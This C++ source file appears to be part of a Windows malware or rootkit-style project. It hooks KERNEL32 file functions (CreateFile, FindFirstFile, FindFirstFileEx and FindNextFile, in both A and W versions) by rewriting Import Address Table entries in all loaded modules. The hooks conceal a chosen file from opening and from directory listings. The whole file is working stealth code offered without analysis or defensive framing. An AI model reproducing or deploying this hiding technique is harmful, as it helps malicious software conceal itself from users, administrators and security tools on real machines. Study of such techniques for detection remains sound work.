
#include <windows.h>
#include <iostream>
#include <string>

#ifdef _DEBUG
#include "Debug.h"
#endif

#include "Hook.h"

#include "FileHiding.h"

std::string fullpath, path, filename;
std::wstring wfullpath, wpath, wfilename;
bool isPathToHiddenFile = false;

std::string getPathFromFullPath(std::string && fullpath_)
{
	size_t backslashPosition = fullpath_.rfind('\\');
	std::string path = fullpath_.substr(0, backslashPosition + 1);

	return path;
}

std::wstring wgetPathFromFullPath(std::wstring && wfullpath_)
{
	size_t backslashPosition = wfullpath_.rfind('\\');
	std::wstring wpath = wfullpath_.substr(0, backslashPosition + 1);

	return wpath;
}

#pragma region

HANDLE WINAPI Hook_FindFirstFileExA(
	LPCSTR             lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID             lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
)
{
#ifdef _DEBUG
	Debug::log("[*] FindFirstFileExA " + std::string(lpFileName));
#endif

	std::string currentDirectoryPath = 
		getPathFromFullPath(std::string(lpFileName));

	::isPathToHiddenFile = (::path == currentDirectoryPath);

	HANDLE hResult = FindFirstFileExA(
		lpFileName,
		fInfoLevelId,
		lpFindFileData,
		fSearchOp,
		lpSearchFilter,
		dwAdditionalFlags
	);

	std::string foundFilename = 
		((WIN32_FIND_DATA *)lpFindFileData)->cFileName;

	if (::isPathToHiddenFile && ::filename == foundFilename) {
		hResult = INVALID_HANDLE_VALUE;
	}

	return hResult;
}

HANDLE WINAPI Hook_FindFirstFileExW(
	LPCWSTR            lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID             lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
)
{
#ifdef _DEBUG
	Debug::log(L"[*] FindFirstFileExW " + std::wstring(lpFileName));
#endif

	std::wstring currentDirectoryPath = 
		wgetPathFromFullPath(std::wstring(lpFileName));

	::isPathToHiddenFile = (::wpath == currentDirectoryPath);

	HANDLE hResult = FindFirstFileExW(
		lpFileName, 
		fInfoLevelId, 
		lpFindFileData, 
		fSearchOp, 
		lpSearchFilter, 
		dwAdditionalFlags
	);

	std::wstring foundFilename =
		((WIN32_FIND_DATAW *)lpFindFileData)->cFileName;

	if (::isPathToHiddenFile && ::wfilename == foundFilename) {
		hResult = INVALID_HANDLE_VALUE;
	}

	return hResult;
}

HANDLE WINAPI Hook_CreateFileA(
	LPCSTR lpFileName,
	DWORD dwDesiredAccess,
	DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes,
	HANDLE hTemplateFile
)
{
#ifdef _DEBUG
	Debug::log("[*] CreateFileA " + std::string(lpFileName));
#endif

	if (::fullpath == lpFileName) {
		return INVALID_HANDLE_VALUE;
	}

	HANDLE hResult = CreateFileA(
		lpFileName,
		dwDesiredAccess,
		dwShareMode,
		lpSecurityAttributes,
		dwCreationDisposition,
		dwFlagsAndAttributes,
		hTemplateFile);

	return hResult;
}

HANDLE WINAPI Hook_CreateFileW(
	LPCWSTR lpFileName,
	DWORD dwDesiredAccess,
	DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes,
	HANDLE hTemplateFile
)
{
#ifdef _DEBUG
	Debug::log(L"[*] CreateFileW " + std::wstring(lpFileName));
#endif

	if (::wfullpath == lpFileName) {
		return INVALID_HANDLE_VALUE;
	}

	HANDLE hResult = CreateFileW(
		lpFileName,
		dwDesiredAccess,
		dwShareMode,
		lpSecurityAttributes,
		dwCreationDisposition,
		dwFlagsAndAttributes,
		hTemplateFile);

	return hResult;
}

HANDLE WINAPI Hook_FindFirstFileA(
	LPCSTR lpFileName,
	LPWIN32_FIND_DATAA lpFindFileData
)
{
#ifdef _DEBUG
	Debug::log("[*] FindFirstFileA " + std::string(lpFileName));
#endif

	::isPathToHiddenFile = (::path == lpFileName);
	HANDLE hResult = FindFirstFileA(lpFileName, lpFindFileData);

	if (::isPathToHiddenFile && ::filename == lpFindFileData->cFileName) {
		hResult = INVALID_HANDLE_VALUE;
	}

	return hResult;
}

HANDLE WINAPI Hook_FindFirstFileW(
	LPCWSTR lpFileName,
	LPWIN32_FIND_DATAW lpFindFileData
)
{
#ifdef _DEBUG
	Debug::log(L"[*] FindFirstFileW " + std::wstring(lpFileName));
#endif

	::isPathToHiddenFile = (::wpath == lpFileName);
	HANDLE hResult = FindFirstFileW(lpFileName, lpFindFileData);

	if (::isPathToHiddenFile && ::wfilename == lpFindFileData->cFileName) {
		hResult = INVALID_HANDLE_VALUE;
	}

	return hResult;
}

BOOL WINAPI Hook_FindNextFileA(
	HANDLE hFindFile,
	LPWIN32_FIND_DATAA lpFindFileData
)
{
#ifdef _DEBUG
	Debug::log("[*] FindNextFileA " + std::string(lpFindFileData->cFileName));
#endif

	BOOL bResult = FindNextFileA(hFindFile, lpFindFileData);

	if (::isPathToHiddenFile && ::filename == lpFindFileData->cFileName) {
		bResult = FindNextFileA(hFindFile, lpFindFileData);
	}

	return bResult;
}

BOOL WINAPI Hook_FindNextFileW(
	HANDLE hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
)
{
#ifdef _DEBUG
	Debug::log(L"[*] FindNextFileW : " + std::wstring(lpFindFileData->cFileName));
#endif

	BOOL bResult = FindNextFileW(hFindFile, lpFindFileData);

	if (::isPathToHiddenFile && ::wfilename == lpFindFileData->cFileName) {
		bResult = FindNextFileW(hFindFile, lpFindFileData);
	}

	return bResult;
}

#pragma endregion

void setPathsToFile(std::string & fileName_)
{
	size_t backslashPosition = fileName_.rfind('\\');

	::fullpath	= fileName_;
	::path		= fullpath.substr(0, backslashPosition + 1);
	::filename	= fullpath.substr(backslashPosition + 1, fullpath.length());

	::wfullpath	= std::wstring(::fullpath.begin(), ::fullpath.end());
	::wpath		= std::wstring(::path.begin(), ::path.end());
	::wfilename	= std::wstring(::filename.begin(), ::filename.end());
}

int FileHiding::hideFile(std::string & fileName)
{
	const std::string moduleName = "KERNEL32.dll";

	const std::string funcNamesToReplace[] = {
		"CreateFileA", "CreateFileW",
		"FindFirstFileA", "FindFirstFileW",
		"FindFirstFileExA", "FindFirstFileExW",
		"FindNextFileA", "FindNextFileW"
	};

	PROC hookFunctions[] = {
		(PROC)::Hook_CreateFileA, (PROC)::Hook_CreateFileW,
		(PROC)::Hook_FindFirstFileA, (PROC)::Hook_FindFirstFileW,
		(PROC)::Hook_FindFirstFileExA, (PROC)::Hook_FindFirstFileExW,
		(PROC)::Hook_FindNextFileA, (PROC)::Hook_FindNextFileW
	};

	setPathsToFile(fileName);

	for (size_t i = 0; i < sizeof(hookFunctions) / sizeof(hookFunctions[0]); i++) {

		FARPROC pfnOriginal = GetProcAddress(
			GetModuleHandle(moduleName.c_str()),
			funcNamesToReplace[i].c_str()
		);
		if (pfnOriginal == nullptr) {
			return -1;
		}

#ifdef _DEBUG
		Debug::log("[+] Address of " + funcNamesToReplace[i] + " has been got");
#endif

		Hook::ReplaceIATEntryInAllModules(
			moduleName.c_str(),
			pfnOriginal,
			hookFunctions[i]
		);
	}

	return 0;
}